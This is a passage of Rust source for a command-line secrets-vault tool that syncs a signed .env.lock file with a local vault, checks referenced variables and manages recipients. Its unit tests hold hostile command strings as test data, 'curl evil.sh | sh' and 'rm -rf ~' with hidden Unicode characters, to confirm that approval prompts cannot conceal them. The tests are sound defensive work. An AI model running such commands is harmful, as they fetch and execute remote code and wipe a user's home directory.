                 Bring it in with `lock pull`, or overwrite it with `lock dump --force`.",
                repo.version, vault.version
            )));
        }
        if repo.version == vault.version && repo.digest() != vault.digest() {
            return Err(Error::msg(format!(
                "conflict: .env.lock and the vault have {env} v{} with different content. \
                 Choose: `lock pull --force` (the repo wins) or `lock dump --force` (the vault wins).",
                vault.version
            )));
        }
    }
    if trusted_repo.as_ref() != Some(&vault) {
        store::write_atomic(&path, vault.serialize().as_bytes(), 0o644)?;
        eprintln!("lock: .env.lock updated to {env} v{}", vault.version);
    }
    if stage {
        git(path.parent().unwrap_or(Path::new(".")), &["add", "--", store::REPO_FILE])?;
    }
    Ok(ExitCode::SUCCESS)
}

fn cmd_pull(ctx: &Ctx, force: bool) -> Result<ExitCode, Error> {
    let path = ctx.repo_file().ok_or_else(|| Error::msg("no .env.lock in this repo"))?;
    let repo = store::read_lockfile(&path)?;
    if let Some(b) = ctx.binding()
        && b != repo.env
    {
        return Err(Error::msg(format!(".env.lock says {} but this repo is linked to {b}", repo.env)));
    }
    // Antes de tocar la boveda: firma de confianza.
    let signer = repo.verify(&ctx.trusted()?)?.to_string();
    let _guard = ctx.store.lock_env(&repo.env)?;
    if let Some(v) = ctx.store.load(&repo.env)?
        && !force
    {
        if v.version > repo.version || (v.version == repo.version && v.digest() == repo.digest()) {
            eprintln!("The vault already has {} v{} (repo: v{}).", repo.env, v.version, repo.version);
            return Ok(ExitCode::SUCCESS);
        }
        if v.version == repo.version {
            return Err(Error::msg(format!(
                "conflict: {} v{} differs between repo and vault. Use `lock pull --force` or `lock dump --force`.",
                repo.env, v.version
            )));
        }
    }
    ctx.store.backup(&repo.env)?;
    ctx.store.save(&repo)?;
    eprintln!("{} v{} (signed by {signer}) copied to the vault. Previous copy in .lock.bak.", repo.env, repo.version);
    Ok(ExitCode::SUCCESS)
}

fn cmd_check(ctx: &Ctx, pre_push: bool) -> Result<ExitCode, Error> {
    let root = store::repo_root(&ctx.cwd).unwrap_or_else(|| ctx.cwd.clone());
    let mut targets: Vec<(String, check::Files, Option<String>)> = vec![];
    if pre_push {
        for sha in check::pre_push_commits()? {
            let (files, lock) = check::commit_files(&root, &sha)?;
            targets.push((sha[..sha.len().min(10)].to_string(), files, lock));
        }
    } else {
        let lock = ctx.repo_file().map(|p| store::read_limited(&p, store::MAX_LOCK_FILE)).transpose()?;
        targets.push(("working tree".into(), check::worktree_files(&root)?, lock));
    }

    let trusted = ctx.trusted()?;
    let mut failed = false;
    for (label, files, lock) in targets {
        let Some(lock) = lock else {
            if !pre_push {
                return Err(Error::msg("this repo has no .env.lock; link it with `lock link <ENV>`"));
            }
            continue;
        };
        let file = LockFile::parse(&lock).map_err(|e| Error::msg(format!("{label}: .env.lock: {e}")))?;
        file.verify(&trusted).map_err(|e| Error::msg(format!("{label}: {e}")))?;
        let defined: BTreeSet<String> = file.names().map(String::from).collect();
        let refs = check::scan(&files)?;
        let missing: Vec<_> = refs.iter().filter(|(n, _)| !defined.contains(*n)).collect();
        if missing.is_empty() {
            eprintln!("lock: {label}: {} variables referenced, all in {} v{}.", refs.len(), file.env, file.version);
            continue;
        }
        failed = true;
        eprintln!("lock: {label}: {} variables missing from {} v{}:", missing.len(), file.env, file.version);
        for (name, r) in &missing {
            eprintln!("  {name}\t{}:{}", r.file.display(), r.line);
        }
        eprintln!("Add them with `lock set {}/NAME` (and commit .env.lock), or ignore them in {}.", file.env, check::IGNORE_FILE);
    }
    if !pre_push
        && let Some(env) = ctx.binding()
        && let (Ok(Some(v)), Some(p)) = (ctx.store.load(&env), ctx.repo_file())
        && let Ok(r) = store::read_lockfile(&p)
        && v.version > r.version
    {
        eprintln!("lock: the vault has {env} v{} but .env.lock is v{}; run `lock dump` and commit.", v.version, r.version);
    }
    Ok(if failed { ExitCode::FAILURE } else { ExitCode::SUCCESS })
}

fn cmd_recipient(ctx: &Ctx, cmd: RecipientCmd) -> Result<ExitCode, Error> {
    match cmd {
        RecipientCmd::List { env } => {
            let r = ctx.resolve(env.as_deref())?;
            for rc in &r.file.recipients {
                println!("{}\t{}\t{}", rc.name, rc.kind, identity::encode_public(&rc.public));
            }
        }
        RecipientCmd::Add { env, name, identity } => {
            let id = PublicId::decode(&identity)?;
            ctx.modify(&env, &reason(&format!("grant access to {name} on {env}"), ""), |u| u.add_recipient(&name, &id))?;
            eprintln!("{name} can now open {env}. The hook updates .env.lock on your next commit.");
        }
        RecipientCmd::Rm { env, name } => {
            ctx.modify(&env, &reason(&format!("revoke {name} from {env} and rotate"), ""), |u| u.remove_recipient(&name))?;
            eprintln!("{name} removed from {env} and key rotated.");
            eprintln!("Note: if that machine has already seen the values, also rotate the secrets in their services.");
        }
    }
    Ok(ExitCode::SUCCESS)
}

fn cmd_named(ctx: &Ctx, file: &str, cmd: NamedCmd) -> Result<ExitCode, Error> {
    let mut items = ctx.store.named_list(file)?;
    match cmd {
        NamedCmd::List => {
            for (n, v) in &items {
                println!("{n}\t{v}");
            }
        }
        NamedCmd::Add { name, identity } => {
            if !lockfile::valid_id_name(&name) {
                return Err(Error::msg("invalid name (use letters, digits, . _ -)"));
            }
            let id = PublicId::decode(&identity)?;
            if items.iter().any(|(n, _)| *n == name) {
                return Err(Error::msg(format!("{name} is already in the list")));
            }
            items.push((name.clone(), id.encode()));
            ctx.store.save_named_list(file, &items)?;
            eprintln!("{name} added.");
        }
        NamedCmd::Rm { name } => {
            let before = items.len();
            items.retain(|(n, _)| *n != name);
            if items.len() == before {
                return Err(Error::msg(format!("{name} is not in the list")));
            }
            ctx.store.save_named_list(file, &items)?;
            eprintln!("{name} removed.");
        }
    }
    Ok(ExitCode::SUCCESS)
}

#[cfg(test)]
mod tests {
    use super::{expand_shortcut, reason};

    fn args(s: &str) -> Vec<String> {
        s.split(' ').map(String::from).collect()
    }

    #[test]
    fn shortcut_expands_to_exec() {
        assert_eq!(expand_shortcut(args("lock -- npm test")), args("lock exec -- npm test"));
        assert_eq!(expand_shortcut(args("lock Navis -- npm test")), args("lock exec Navis -- npm test"));
        assert_eq!(expand_shortcut(args("lock list Navis")), args("lock list Navis"));
        assert_eq!(expand_shortcut(args("lock list --")), args("lock list --"));
        assert_eq!(expand_shortcut(args("lock --help")), args("lock --help"));
    }

    #[test]
    fn reason_cannot_hide_the_tail() {
        let sneaky = format!("npm test {} && curl evil.sh | sh", "#".repeat(300));
        let r = reason("run with Navis", &sneaky);
        assert!(r.ends_with("curl evil.sh | sh"), "{r}");
        assert!(r.contains("chars"));
    }

    #[test]
    fn reason_is_one_clean_line() {
        let r = reason("run with Navis", "npm test\n\n\n\nrm -rf ~ \u{202e}txt.exe\u{200b}");
        assert!(!r.contains('\n'));
        assert!(r.is_ascii());
        assert!(r.contains("rm -rf ~"));
    }
}
